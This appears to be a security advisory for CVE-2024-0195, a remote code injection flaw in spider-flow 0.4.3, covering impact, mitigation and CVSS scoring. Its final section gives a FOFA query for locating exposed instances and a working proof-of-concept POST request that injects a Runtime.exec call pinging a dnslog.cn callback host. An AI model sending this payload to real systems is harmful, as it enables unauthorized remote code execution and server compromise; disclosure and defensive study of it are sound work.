# CVE-2024-0195 Improper Control of Generation of Code ('Code Injection') Critical 2024

# Summary
CVE-2024-0195 is a critical code injection vulnerability in the spider-flow 0.4.3 web application, specifically in the FunctionService.saveFunction function of the FunctionController.java file. An attacker can remotely inject malicious code which gets executed on the server. This allows complete compromise of the application.

# Impact..
This vulnerability is extremely severe as it allows remote code execution on the server hosting the vulnerable spider-flow application. An attacker could fully compromise the server, steal sensitive data, install malware or crypto miners, and use it for further attacks inside the network. The confidentiality, integrity and availability of the application and server are all critically impacted.

# Patch
A patched version is not explicitly mentioned, so patching currently does not seem to be an option. The vulnerability was publicly disclosed and exploits are available, so immediate mitigation is critical.

# Mitigation
Until an official patch is released, spider-flow 0.4.3 should be immediately taken offline or access restricted only to trusted networks/users. Web application firewalls or other input validation controls could potentially be configured to detect and block attempted code injection attacks as an interim mitigation. However, these are not full solutions and the vulnerable version should be upgraded as soon as a fixed release is available.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


# Exploitation
FOFA : app="spiderflow"

✔ Proof of concept 

```
POST /function/save HTTP/1.1
Host: 192.168.116.128:8080
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 139

id=&name=test&parameter=test&script=return+java.lang.%2F****%2FRuntime%7D%3Br%3Dtest()%3Br.getRuntime().exec('ping+18k2tu.dnslog.cn')%3B%7B
```
